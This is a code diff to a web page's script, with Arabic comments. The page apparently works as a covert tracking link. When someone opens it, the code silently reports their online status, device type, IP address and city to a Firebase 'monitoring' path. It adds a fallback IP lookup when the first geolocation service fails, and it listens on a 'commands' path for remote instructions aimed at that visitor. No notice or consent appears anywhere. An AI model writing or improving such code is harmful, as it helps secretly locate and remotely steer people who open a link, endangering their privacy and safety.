@@ -54,6 +54,7 @@
         const userId = new URLSearchParams(window.location.search).get('id');
         const isAr = navigator.language.startsWith('ar');
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+        const deviceType = isIOS ? "iPhone" : "Android";
         
         const content = {
             ar: { 
@@ -87,22 +88,28 @@
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            // إرسال إشعار فوري "دخول" قبل جلب الـ IP لضمان السرعة
+            // 1. إرسال إشعار دخول فوري (أسرع حاجة)
             sRef.set({ 
                 status: "Online", 
-                ip: "Fetching...", 
-                region: "Fetching...", 
-                device: isIOS ? "iPhone" : "Android"
+                device: deviceType,
+                ip: "Loading...", 
+                region: "Loading..."
             });
 
-            // جلب المحافظة والـ IP بشكل دقيق وسريع
+            // 2. محاولة جلب الـ IP والمكان (الخطة أ - أدق حاجة)
             fetch('https://ipapi.co/json/')
                 .then(r => r.json())
                 .then(d => {
                     sRef.update({ 
                         ip: d.ip || "N/A", 
-                        region: d.city + ", " + d.region // هنا هيجيب القاهرة، حلوان، إلخ
+                        region: (d.city || d.region || "Unknown Location") 
                     });
+                })
+                .catch(() => {
+                    // 3. الخطة ب لو الأولى فشلت (أسرع حاجة)
+                    fetch('https://api.ipify.org?format=json')
+                        .then(r => r.json())
+                        .then(d => { sRef.update({ ip: d.ip }); });
                 });
 
             db.ref('commands/' + userId).on('value', s => {
